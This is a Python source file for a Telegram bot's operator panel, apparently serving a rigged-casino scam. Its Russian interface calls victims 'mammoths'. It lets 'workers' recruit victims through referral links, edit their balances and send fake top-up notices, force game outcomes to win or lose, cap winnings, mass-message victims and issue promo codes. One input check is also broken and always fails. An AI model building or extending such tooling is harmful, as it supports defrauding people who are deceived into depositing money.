from re import I
from typing import Union

from sqlalchemy.sql.expression import null
from sqlalchemy.sql.functions import user


from utils.db_api.models import User
from utils.db_api.database import db
from utils.db_api.db_commands import add_user

import asyncio
import string
import random

from data.config import ADMINS

from aiogram import Bot
from aiogram import types
from aiogram.dispatcher.filters import Command, state
from aiogram.dispatcher import FSMContext

from loader import dp, bot

from keyboards.default.start_menu_keyboards import start_menu
from keyboards.default.worker_panel_keybpards import work_panel
from keyboards.default.worker_mamont_list import mamont_list
from keyboards.inline.worker_mamont_menu import mamont_menu, mamont_menu_keyboard
from keyboards.inline.cancel_key import cancel_func
from keyboards.default.cancel_func import cancel_funcion
from handlers.states import Worker_Edit, Worker_Edit_Status, Worker_Add_Coupon, Worker_Mailing_Mamonts, Worker_Mailing_Mamont, Worker_Limit_Mamonts
from utils.db_api.db_commands import update_limit_casino, delete_refferal_mamont, delete_refferal_mamonts, get_user_from_edit, edit_money_user, get_user, update_addmoney, edit_status_user, worker_check, get_user_refferals, add_coupon,edit_worker_user
from utils.db_api.models import User, Coupons

@dp.message_handler(commands=["work"])
async def work_panel_start(message: types.Message):
    ref_id=message.from_user.id
    bot_username = (await bot.me).username
    bot_link = f"https://t.me/{bot_username}?start={ref_id}"

    await message.answer(f"🕵️‍♂️Меню Воркера, {message.from_user.full_name}\n\n Ваша реферальная ссылка - {bot_link}\n ",reply_markup=work_panel)
    await edit_worker_user(True,message.from_user.id)

@dp.message_handler(commands=["cancel"])
async def work_panel_cancel_mailing(message: types.Message):
    checked_worker= await worker_check(message.from_user.id)
    if(checked_worker):
        await message.answer(f"Вы отменили действие!",reply_markup=work_panel)

@dp.message_handler(text="Отменить действие", state=Worker_Mailing_Mamonts)
async def worker_cancel(message: types.Message, state: FSMContext, text, markup):
    checked_worker= await worker_check(message.from_user.id)
    if(checked_worker):
        await bot.send_message(chat_id=message.from_user.id, text=text, reply_markup=markup)
        await state.reset_state()

async def worker_cancel2(message: types.Message, state: FSMContext, text, markup):
    checked_worker= await worker_check(message.from_user.id)
    if(checked_worker):
        await bot.send_message(chat_id=message.from_user.id, text=text, reply_markup=markup)
        user = await get_user(message.from_user.id)
        await work_panel_mamont2(message, user.add_money)
        await state.reset_state()

@dp.message_handler(text="Отменить действие", state=Worker_Edit)
async def worker_cancel_dobl(message: types.Message, state: FSMContext):
    await worker_cancel2(message,state,"🔙 Вы вернулись к мамонту🧨", mamont_list)

@dp.message_handler(text="Отменить действие", state=Worker_Mailing_Mamont)
async def worker_cancel_dobl(message: types.Message, state: FSMContext):
    await worker_cancel2(message,state,"🔙 Вы вернулись к мамонту🧨", mamont_list)
    
@dp.message_handler(text="Отменить действие", state=Worker_Edit_Status)
async def worker_cancel_dobl(message: types.Message, state: FSMContext):
    await worker_cancel2(message,state,"🔙 Вы вернулись к мамонту🧨", mamont_list)

@dp.message_handler(text="Отменить действие", state=Worker_Limit_Mamonts)
async def worker_cancel_dobl(message: types.Message, state: FSMContext):
    await worker_cancel2(message,state,"🔙 Вы вернулись к мамонту🧨", mamont_list)

@dp.message_handler(text="Отменить действие", state=Worker_Add_Coupon)
async def worker_cancel_dobl(message: types.Message, state: FSMContext):
    await worker_cancel(message,state,"🔙 Вы вернулись в ворк меню", work_panel)

@dp.message_handler(text="🔙Назад в меню")
async def back_to_menu_work(message: types.Message):
    await message.answer(f"🔙 Вы вернулись в ворк меню", reply_markup=work_panel)

#--------------------------------------------------------------СПИСОК МАМОНТОВ---------------------------------------------------------------------------------
@dp.message_handler(text="Список мамонтов🧨")
async def work_panel_list_mamonts(message: types.Message):
    checked_worker= await worker_check(message.from_user.id)
    if(checked_worker):
        user= await get_user(message.from_user.id)
        users= await get_user_refferals(user.user_id)
        text=""
        for user in users:
            text = text + f"/u{user.user_id} | {user.full_name} | @{user.username}\n"
        await message.answer(text,parse_mode=None, reply_markup=mamont_list)

@dp.message_handler(text="🧨Список мамонтов")
async def work_panel_list_mamonts2(message: types.Message):
    await work_panel_list_mamonts(message)
#----------------------------------------------------------------УДАЛИТЬ ВСЕХ МАМОНТОВ--------------------------------------------------------------------------

@dp.message_handler(text="🗑️Удалить всех мамонтов")
async def worker_delete_all_mamonts(message: types.Message):
    await delete_refferal_mamonts(message.from_user.id)
    await bot.send_message(chat_id=message.from_user.id, text=f"Все мамонты удалены✅")

#----------------------------------------------------------------ПРОСМОТР МАМОНТА--------------------------------------------------------------------------

async def work_panel_mamont(message: types.Message):
    id = int(message.text[2:])
    await work_panel_mamont2(message, id)

async def work_panel_mamont2(message: types.Message, id):
    user = await get_user(id)
    if(user):
        if(user.referral==message.from_user.id):
            markup = await mamont_menu_keyboard(user.user_id)
            limit_casino=str(user.limit_casino)
            if(user.limit_casino==0):
                limit_casino = "Выключен"
            await bot.send_message(chat_id=message.from_user.id, text=f"Имя: {user.full_name}\n🆔: {user.user_id}\n💱Валюта: {user.payment}\n💰Баланс: {user.cash}\n📌Статус: {user.casino_hack}\n⚙️Лимит: {limit_casino}", reply_markup=markup)
    else:
        await bot.send_message(chat_id=message.from_user.id, text=f"Что-то пошло не так")

#--------------------------------------------------------------------МЕНЮ МАМОНТА--------------------------------------------------------------------------------
@dp.callback_query_handler(mamont_menu.filter())
async def admin_panel_mamont_agree(message: types.Message, callback_data: dict):
    user_id= int(callback_data.get('user_id'))
    action = int(callback_data.get('action'))
    if(action==0):
        await delete_refferal_mamont(user_id)
        await bot.send_message(chat_id=message.from_user.id, text=f"Мамонт удален✅", reply_markup=mamont_list)
    elif(action==1):
        await work_panel_edit_cashing_menu(message, user_id)
    elif(action==2):
        await work_panel_edit_cashing_stat_menu(message, user_id)
    elif(action==3):
        await work_panel_write_message_mamont(message, user_id)
    elif(action==4):
        await work_panel_write_limit_mamont(message, user_id)



#----------------------------------------------------------------РАССЫЛКА ОДНОМУ МАМОНТУ--------------------------------------------------------------------------
async def work_panel_write_message_mamont(message: types.Message, user_id):
    await update_addmoney(message.from_user.id, user_id)
    await bot.send_message(chat_id=message.from_user.id, text=f"Введите текст сообщения:", reply_markup=cancel_funcion)
    await Worker_Mailing_Mamont.Worker_Mailing_Mamont_End.set()


@dp.message_handler(state=Worker_Mailing_Mamont.Worker_Mailing_Mamont_End)
async def work_panel_write_message_mamont_2(message:types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    user_id = user.add_money
    msg = message.text
    await bot.send_message(chat_id=user_id, text=msg)
    await bot.send_message(chat_id=message.from_user.id, text=f"Сообщение успешно отправлено✅", reply_markup=mamont_list)
    await work_panel_mamont2(message, user_id)
    await state.reset_state()

#----------------------------------------------------------------ЛИМИТ МАМОНТУ--------------------------------------------------------------------------
async def work_panel_write_limit_mamont(message: types.Message, user_id):
    await update_addmoney(message.from_user.id, user_id)
    await bot.send_message(chat_id=message.from_user.id, text=f"⚙️Введите лимит :\n(Введите 0, чтобы отключить)", reply_markup=cancel_funcion)
    await Worker_Limit_Mamonts.Worker_Limit_Mamont.set()


@dp.message_handler(state=Worker_Limit_Mamonts.Worker_Limit_Mamont)
async def work_panel_write_limit_mamont_2(message:types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    user_id = user.add_money
    limit = int(message.text)
    
    await update_limit_casino(user_id, limit)

    await bot.send_message(chat_id=message.from_user.id, text=f"Лимит выигриша изменен✅", reply_markup=mamont_list)
    await work_panel_mamont2(message, user_id)
    await state.reset_state()

#----------------------------------------------------------------РАССЫЛКА ВСЕМ МАМОНТАМ--------------------------------------------------------------------------

@dp.message_handler(text="🔊Рассылка всем мамонтам")
async def worker_mailing_write_all_mamonts(message: types.Message):
    await bot.send_message(chat_id=message.from_user.id, text=f"Введите текст сообщения:", reply_markup=cancel_funcion)
    await Worker_Mailing_Mamonts.Worker_Mailing_Mamont.set()

@dp.message_handler(state=Worker_Mailing_Mamonts.Worker_Mailing_Mamont)
async def worker_mailing_all_mamonts(message:types.Message, state: FSMContext):
    msg = message.text
    users= await get_user_refferals(message.from_user.id)
    for user in users:
        await bot.send_message(chat_id=user.user_id, text=msg)
    await bot.send_message(chat_id=message.from_user.id, text=f"Сообщения успешно отправлены✅", reply_markup=mamont_list)
    await state.reset_state()

#--------------------------------------------------------------ИЗМЕНИТЬ БАЛАНС---------------------------------------------------------------------------------

async def work_panel_edit_cashing_menu(message:types.Message, id_user):
    user= await get_user(message.from_user.id)
    mamont = await get_user(id_user)
    if(mamont.referral!=user.user_id):
        await bot.send_message(chat_id=message.from_user.id, text="Это не твой реферал!")
        return
    else:
        await update_addmoney(message.from_user.id, id_user)
        await bot.send_message(chat_id=message.from_user.id, text="Введите новый баланс пользователя:", reply_markup=cancel_funcion)
        await Worker_Edit.Worker_Edit_Text_Price.set()

@dp.message_handler(state=Worker_Edit.Worker_Edit_Text_Price)
async def work_panel_edit_cashing(message:types.Message, state: FSMContext):
    user = await get_user(message.from_user.id)
    mamont= await get_user(user.add_money)
    price = int(message.text) - mamont.cash
    await edit_money_user(message.text, user.add_money)
    user = await get_user(user.add_money)
    await update_addmoney(message.from_user.id, 0)
    text = f"Баланс изменен:\nId: {user.user_id} | Username: {user.full_name} | Login: @{user.username} | Cash: {user.cash}\n"
    await state.reset_state()
    await bot.send_message(chat_id=message.from_user.id, text=text, reply_markup=mamont_list, parse_mode=None)
    await work_panel_mamont2(message, user.user_id)
    if(price>0):
        await bot.send_message(chat_id=user.user_id, text=f"Ваш баланс успешно пополнен на {price} {mamont.payment}✅")
    if(price<0):
        price=price*-1
        await bot.send_message(chat_id=user.user_id, text=f"С вашего баланса вычтено {price} {mamont.payment}")
#--------------------------------------------------------------ИЗМЕНИТЬ СТАТУС---------------------------------------------------------------------------------

async def work_panel_edit_cashing_stat_menu(message:types.Message, id_user):
    user= await get_user(message.from_user.id)
    mamont = await get_user(id_user)
    if(mamont.referral!=user.user_id):
        await bot.send_message(chat_id=message.from_user.id, text="Это не твой реферал!")
        return
    else:
        await update_addmoney(message.from_user.id, id_user)
        await bot.send_message(chat_id=message.from_user.id, text="📌Введите новый статус пользователя \n1-Выйгрыш\n2-Проигрыш\n3-Рандом:",parse_mode=None, reply_markup=cancel_funcion)
        await Worker_Edit_Status.Worker_Edit_Text_Price.set()

@dp.message_handler(state=Worker_Edit_Status.Worker_Edit_Text_Price)
async def work_panel_edit_cashing(message:types.Message, state: FSMContext):
    if(message.text!='1' or message.text!='2' or message.text!='3'):
        await bot.send_message(chat_id=message.from_user.id, text="Введите число от 1 до 3!", reply_markup=cancel_funcion)
    user = await get_user(message.from_user.id)
    await edit_status_user(message.text, user.add_money)
    user = await get_user(user.add_money)
    await update_addmoney(message.from_user.id, 0)
    text = f"Статус изменен:\nId: {user.user_id} | Username: {user.full_name} | Login: @{user.username} | Status: {user.casino_hack}\n"
    await bot.send_message(chat_id=message.from_user.id, text=text, reply_markup=mamont_list, parse_mode=None)
    await work_panel_mamont2(message, user.user_id)
    await state.reset_state()
    
#------------------------------------------------------------COUPON----------------------------------------------------------------------------------
@dp.message_handler(commands=["cancel"], state=Worker_Add_Coupon)
async def work_panel_cancel_mailing(message: types.Message, state: FSMContext):
    await message.answer(f"Вы отменили действие!")
    await state.reset_state()

async def generate_alphanum_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    rand_string = ''.join(random.sample(letters_and_digits, length))
    return rand_string

@dp.message_handler(text="Создать промокод🔮")
async def work_panel_coupon_add(message: types.Message):
    await message.answer("Для отмены введите /cancel\nВведите сумму промокода:")
    await Worker_Add_Coupon.Worker_Add_Coupon_Add.set()

@dp.message_handler(state=Worker_Add_Coupon.Worker_Add_Coupon_Add)
async def work_panel_coupon_end(message:types.Message, state: FSMContext):
    try:
        price = int(message.text)
    except ValueError:
        await message.answer("⛔️Неправильно, Введите число!")
        return
    coupon_code = await generate_alphanum_random_string(12)
    await add_coupon(coupon_code, message.from_user.id, price)
    await message.answer(f"Промокод: {coupon_code}\nСумма: {price}\n✅Успешно создан!")
    await state.reset_state()

#----------------------------------------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------ВЫХОД---------------------------------------------------------------------------------

@dp.message_handler(text="Выйти")
async def work_panel_out(message: types.Message):
    checked_worker= await worker_check(message.from_user.id)
    if(checked_worker):
        await message.answer(f"{message.from_user.full_name}, Вы вышли из ворк панели",reply_markup=start_menu)


    




